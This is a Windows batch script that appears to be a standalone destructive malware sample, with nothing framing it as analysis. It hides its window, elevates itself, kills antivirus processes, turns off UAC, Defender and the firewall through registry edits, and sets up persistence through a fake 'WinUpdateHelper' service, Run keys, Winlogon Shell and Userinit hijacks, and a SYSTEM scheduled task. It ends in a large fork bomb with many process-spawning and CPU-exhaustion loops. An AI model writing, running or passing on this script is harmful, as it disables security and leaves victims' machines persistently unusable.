@echo off
setlocal enabledelayedexpansion

::NoConsole 
if "%~1"=="" exit /b
set "target=%~1"
set "output=%~dpn1_hidden.vbs"
echo Set WshShell = CreateObject("WScript.Shell") > "%output%"
echo WshShell.Run chr(34) ^& "%target%" ^& Chr(34), 0, False >> "%output%"
start /b wscript.exe //B //Nologo "%output%"

::admin
if "%1"=="admin" goto :admin
powershell -Command "Start-Process '%~f0' -ArgumentList 'admin' -Verb RunAs"
exit /b
:admin


if not "%1"=="bios_level" (
    powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
        $code = @'
        [DllImport(\"kernel32.dll\")]public static extern IntPtr GetCurrentProcess();
        [DllImport(\"advapi32.dll\")]public static extern bool OpenProcessToken(IntPtr h,uint a,out IntPtr t);
        [DllImport(\"advapi32.dll\")]public static extern bool AdjustTokenPrivileges(IntPtr t,bool d,ref TOKEN_PRIVILEGES p,uint l,IntPtr p,IntPtr r);
        public struct TOKEN_PRIVILEGES{public uint Count;public long Luid;public uint Attr;}
        public const uint SE_PRIVILEGE_ENABLED=0x2;
        public const string SE_SHUTDOWN_NAME=\"SeShutdownPrivilege\";
        public const uint TOKEN_ADJUST_PRIVILEGES=0x20;
        public const uint TOKEN_QUERY=0x8;
'@
        Add-Type -MemberDefinition $code -Name Win32 -Namespace System
        $proc = [System.Diagnostics.Process]::GetCurrentProcess()
        $hdl = $proc.Handle
        Invoke-Expression 'cmd /c start /trustlevel:0x40000 %~s0 bios_level'
    " >nul 2>&1
    exit /b
)

::other
taskkill /f /im MsMpEng.exe /im AntimalwareServiceExecutable.exe /im SecurityHealthService.exe >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
sc create "WinUpdateHelper" binPath= "\"%~f0\"" start= auto type= own type= interact >nul 2>&1
sc start "WinUpdateHelper" >nul 2>&1
copy %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
copy %0 "C:\Windows\Tasks\bomb.bat" >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe, C:\Windows\Tasks\bat.bat" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "%0" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ForkBomb_%random%" /t REG_SZ /d "%~f0" /f 2>nul
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,%~f0" /f 
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f
schtasks /create /tn "WindowsUpdateService" /tr "C:\Windows\Tasks\bomb.bat" /sc onlogon /ru SYSTEM /f >nul 2>&1

:forkbomb
%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0|%0
:%|start%
start %0
%0
set comspec=%0
cmd /c start %0
%comspec%
start cmd /c "%0"
start powershell -Command "while(1){Start-Process cmd.exe}"
start "" /min cmd /c %0
start "" /min powershell -c "while(1){Start-Process cmd -Args '/c %0'}"
start "" /min wscript.exe //e:jscript "while(1){new ActiveXObject('WScript.Shell').Run('cmd /c %0',0)}"
wmic process call create "cmd.exe /c %0"
start "" "%~f0"
start cmd /c "%0 & %0 & %0"
for /l %%x in (0,0,0) do start %0
start "" /realtime cmd /c "for /l %%x in (1,0,2147483647) do (start /realtime cmd /c %0 & %0)"
powershell -WindowStyle Hidden -Command "while(1){Get-Process -Name 'explorer' -ErrorAction SilentlyContinue|Stop-Process -Force;Start-Process -WindowStyle Hidden -PassThru cmd -Args '/c %0'|ForEach-Object{$_.ProcessorAffinity=1;$_.PriorityClass='Realtime'}}"
powershell -c "while($true){Start-Process powershell -ArgumentList '-c while($true){Start-Process powershell}'}"
set "c=cmd"
set "s=start"
set "f=%~f0"
set "p= /c"
%c%%p% %s% "" "%f%"
%c%%p% %s% "" "%c%%p% %s% "" "%f%""
%c%%p% %s% "" "%f%"
start /min cmd /c "C:\Windows\System32\drivers\etc\hosts.bat"
start /b "" %0 
start /b cmd /c "for /l %%x in (1,0,2) do echo %%x"
wmic process call create "cmd.exe"
for /l %%i in (1,1,8) do (
    start /b /low /min cmd /c "for /l %%j in (1,1,4) do (start /b /min cmd /c @echo off ^& for /l in () do (set /a n=1))"
)
tasklist /fi "IMAGENAME eq cmd.exe" /fo csv | findstr /i "%~nx0" >nul
if errorlevel 1 (
    start /b /min "%~f0"
    start /b /min cmd /c "for /l in () do start %~f0"
)
for /l %%c in (1,1,256) do start /b /high cmd /c "for /l in () do set /a x=%%c*%%c"
wmic process where name="cmd.exe" call setpriority "realtime time critical" >nul 2>&1
echo $x={for(){start-process 'cmd' '-/c start /b cmd /c for /l in () do start cmd' -WindowStyle Hidden}} > "%temp%\bomb.ps1"
powershell -ExecutionPolicy Bypass -File "%temp%\bomb.ps1" 2>nul
for /f "tokens=2" %%a in ('tasklist /fi "IMAGENAME eq cmd.exe" /fo csv ^| findstr /v "PID"') do (
    wmic process where "ProcessId=%%a" call create "%~f0" >nul 2>&1
)
start "" cmd /c "%~f0"
start "" powershell -Command "while(1){Start-Process -NoNewWindow -FilePath '%~f0'}"
for /l %%i in (1,1,4) do (
    start /b "" "%~f0"
    start /min "" "%~f0"
)
start /b cmd /c for /L %%i in (1,0,1000000) do echo STRESS >nul
start /high /min cmd /c "for /l %%n in () do set /a n=%%n*%%n"
start /b cmd /c "for /l %%n in () do (echo %%n >nul)"
start /b cmd /c "for /l %%n in () do (md %%n && rd %%n)"
start /b cmd /c "for /l %%n in () do set /a dummy=!random!*!random!"
goto forkbomb


